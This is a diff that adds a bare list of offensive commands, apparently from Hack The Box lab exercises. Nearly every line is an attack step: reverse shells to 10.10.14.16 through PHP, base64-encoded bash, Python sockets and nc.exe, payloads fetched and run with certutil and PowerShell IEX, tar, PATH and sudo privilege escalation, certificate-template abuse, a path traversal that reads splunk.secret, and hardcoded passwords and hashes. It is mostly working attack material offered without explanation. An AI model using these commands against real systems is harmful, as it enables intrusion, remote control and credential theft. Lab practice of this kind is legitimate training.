@@ -1,0 +1,70 @@
+php -r '$sock=fsockopen("10.10.14.16",9001);system("sh <&3 >&3 2>&3");' > /dev/null 2>&1 &
+nc -lvnp 9001
+echo YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMTYvNTU1NSAwPiYxIg== | base64 -d | bash
+nc -lvnp 5555
+python -c "import pty;pty.spawn('/bin/bash')"
+sqlite3 tickets.db
+echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+impacket-wmiexec -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
+sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
+./14339.sh
+nc -lvnp 4444
+python3 nibble_exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
+cat shell.php
+php -r '...reverse shell...'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+su theseus
+printf '%s\n' '#!/bin/sh' 'python3 -c '\''import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.16",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'\'' ' > /tmp/cat
+chmod +x /tmp/cat
+export PATH=/tmp:$PATH
+/bin/sysinfo
+python3 -m http.server 80
+wget http://10.10.11.236/website-backup-27-07-23-old.zip
+unzip website-backup-27-07-23-old.zip
+cat .old-conf.xml
+evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
+impacket-lookupsid anonymous@manager.htb -no-pass
+impacket-lookupsid anonymous@manager.htb -no-pass | grep 'SidTypeUser' | awk -F '\\' '{print $2}' | awk '{print $1}' > users
+netexec smb 10.10.11.236 -u users -p users
+impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
+xp_dirtree \
+xp_dirtree \inetpub
+xp_dirtree \inetpub\wwwroot
+wget http://10.10.11.236/website-backup-27-07-23-old.zip
+certipy-ad find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
+certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven
+certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca
+certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
+certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request 13
+certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve 13
+certipy-ad auth -pfx administrator.pfx
+sudo ntpdate -s manager.htb
+certipy-ad auth -pfx administrator.pfx
+evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
+smbclient -L \\\\10.10.11.236\\ -N
+smbclient //10.10.11.236/Public -N
+smbclient //flight.htb/Web -U 'c.bum'
+put shell.PHP
+xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.16:4000/nc.exe C:\Users\sql_svc\Desktop\nc.exe';
+EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc.exe -e cmd.exe 10.10.14.16 4444';
+certutil -urlcache -split -f "http://10.10.14.16/RunasCs.exe" RunasCs.exe
+.\RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "powershell -ExecutionPolicy Bypass -File C:\users\public\music\shell5555.ps1"
+nc -lvnp 5555
+stty raw -echo ; fg ; reset
+curl -s "${base_url}/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/splunk.secret"
+echo 'c.bum::flight.htb:...'> /etc/passwd (example from notes)
+python -c "import socket,os,pty;s=socket.socket();s.connect(('10.10.14.16',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
+scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip .
+git clone https://github.com/vdohney/keepass-password-dumper.git
+dotnet run /path/to/KeePassDumpFull.dmp
+kpcli
+curl -k --silent "http://nagios.monitored.htb/nagiosxi/api/v1/system/user&apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" -d "username=tcg&password=YoullNeverGuessThis&name=TCG&email=tcg@localhost&auth_level=admin"
+sudo /usr/bin/systemctl status trail.service
+sudo -l
+find / -name "targetedKerberoast.py" 2>/dev/null
+gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
+impacket-mssqlclient mssql-svc:corporate568@MSSQL_IP -windows-auth
+xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.16/shell.ps1\")"'
